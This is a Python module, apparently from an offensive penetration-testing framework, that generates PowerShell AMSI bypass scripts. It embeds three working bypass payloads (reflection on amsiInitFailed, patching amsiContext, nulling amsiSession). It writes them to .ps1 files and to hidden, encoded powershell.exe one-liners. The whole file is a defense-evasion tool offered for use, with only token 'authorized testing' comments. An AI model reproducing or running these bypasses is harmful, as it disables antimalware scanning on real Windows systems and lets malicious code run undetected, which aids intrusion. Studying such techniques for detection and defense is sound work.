#!/usr/bin/env python3
"""
AMSI Bypass Loader Module
Provides PowerShell AMSI bypass techniques
"""
import sys
import os
import argparse
import base64

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.logger import setup_logger, get_logger

logger = None

# Common AMSI bypass techniques (Base64 encoded for evasion)
AMSI_BYPASSES = {
    "reflection": """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
""",
    "memory_patch": """
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
""",
    "null_patch": """
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
"""
}

def generate_amsi_bypass(session_dir, method="reflection"):
    """Generate AMSI bypass script"""
    global logger
    setup_logger("amsi_bypass", session_dir)
    logger = get_logger("amsi_bypass")
    
    logger.info(f"Generating AMSI bypass using method: {method}")
    
    bypass_code = AMSI_BYPASSES.get(method, AMSI_BYPASSES["reflection"])
    
    # Create PowerShell script
    ps_file = os.path.join(session_dir, f"amsi_bypass_{method}.ps1")
    with open(ps_file, 'w') as f:
        f.write("# AMSI Bypass - Use at your own risk\n")
        f.write("# Only for authorized testing\n\n")
        f.write(bypass_code)
        f.write("\n\nWrite-Host '[+] AMSI Bypass Applied' -ForegroundColor Green\n")
    
    # Create base64 encoded version for one-liner execution
    b64_code = base64.b64encode(bypass_code.encode('utf-16le')).decode()
    
    oneliner_file = os.path.join(session_dir, f"amsi_bypass_{method}_oneliner.txt")
    with open(oneliner_file, 'w') as f:
        f.write(f"# AMSI Bypass One-Liner\n")
        f.write(f"powershell.exe -NoP -NonI -W Hidden -Enc {b64_code}\n\n")
        f.write(f"# Or inline:\n")
        f.write(f"powershell.exe -NoP -NonI -C \"{bypass_code.strip()}\"\n")
    
    logger.info(f"AMSI bypass saved: {ps_file}")
    logger.info(f"One-liner saved: {oneliner_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--method", choices=["reflection", "memory_patch", "null_patch"], default="reflection")
    args = parser.parse_args()
    
    generate_amsi_bypass(args.session_dir, args.method)
